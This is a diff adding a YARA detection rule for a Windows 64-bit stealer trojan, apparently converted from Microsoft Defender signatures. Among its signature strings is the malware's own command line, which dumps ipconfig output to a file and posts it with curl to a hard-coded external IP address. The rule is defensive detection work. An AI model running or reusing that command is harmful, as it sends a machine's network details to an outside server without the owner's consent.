@@ -892,3 +892,26 @@ rule Trojan_Win64_Stealer_AHD_2147961486_0
         (all of ($x*))
 }
 
+rule Trojan_Win64_Stealer_SLWK_2147961908_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:Win64/Stealer.SLWK!MTB"
+        threat_id = "2147961908"
+        type = "Trojan"
+        platform = "Win64: Windows 64-bit platform"
+        family = "Stealer"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
+        threshold = "6"
+        strings_accuracy = "Low"
+    strings:
+        $x_2_1 = {43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 51 41 58 53 61 66 65 5c [0-20] 2e 62 69 6e}  //weight: 2, accuracy: Low
+        $x_2_2 = "C:\\Users\\Public\\ip.txt" ascii //weight: 2
+        $x_2_3 = "cmd.exe /c \"ipconfig /all > \"%s\" 2>&1 && curl -X POST http://120.27.211.70:8000/send -H \"Content-Type: text/plain; charset=gbk\" --data-binary @\"%s\" 2>&1\"" ascii //weight: 2
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
